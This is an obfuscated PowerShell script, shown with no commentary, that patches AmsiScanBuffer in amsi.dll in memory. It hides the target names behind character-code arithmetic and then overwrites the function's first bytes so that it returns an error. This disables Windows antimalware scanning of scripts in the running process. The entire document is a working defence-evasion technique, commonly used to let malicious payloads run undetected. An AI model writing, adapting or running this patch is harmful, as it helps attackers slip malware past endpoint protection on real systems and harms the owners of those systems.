$NY8PYr = @"
using System;
using System.Runtime.InteropServices;
public class NY8PYr {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr _4wnYGYZ, string y9a3KP);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr mRfmWepia, UIntPtr MKY, uint B9aWWG8LFZm, out uint Gz4eiiNwT6yLPWZ9);
}
"@

Add-Type $NY8PYr

$oYXiKVZ9AoCOSXkmj7SF = [NY8PYr]::LoadLibrary("$([CHar](97*2/2)+[cHaR]([bYTE]0x6d)+[chaR](82+33)+[ChAR]([BYtE]0x69)+[cHAR]([BYTe]0x2e)+[cHAR](100+30-30)+[chaR](19+89)+[cHaR](108+90-90))")
$enwyaZN = [NY8PYr]::GetProcAddress($oYXiKVZ9AoCOSXkmj7SF, "$(('ÂmsîScânB'+'úffèr').NOrMaliZe([CHAR](70*68/68)+[chAr](111+23-23)+[ChaR]([bYte]0x72)+[chAr]([BYte]0x6d)+[chaR]([bYTe]0x44)) -replace [ChAr](34+58)+[ChAr]([bYTE]0x70)+[chAr]([bYtE]0x7b)+[cHaR](77*32/32)+[Char](110*51/51)+[Char](88+37))")
$p = 0
[NY8PYr]::VirtualProtect($enwyaZN, [uint32]5, 0x40, [ref]$p)
$gA0FClLnObIEDr2uIr53 = "0xB8"
$IeZWQWkLq1vMNvqUMKmW = "0x57"
$nz00cn10Usvz3_ = "0x00"
$rqw = "0x07"
$X6ORcge_Otxt9UlaG = "0x80"
$WZXyneuIKXq = "0xC3"
$addf4FG9a2GyPp = [Byte[]] ($gA0FClLnObIEDr2uIr53,$IeZWQWkLq1vMNvqUMKmW,$nz00cn10Usvz3_,$rqw,+$X6ORcge_Otxt9UlaG,+$WZXyneuIKXq)
[System.Runtime.InteropServices.Marshal]::Copy($addf4FG9a2GyPp, 0, $enwyaZN, 6)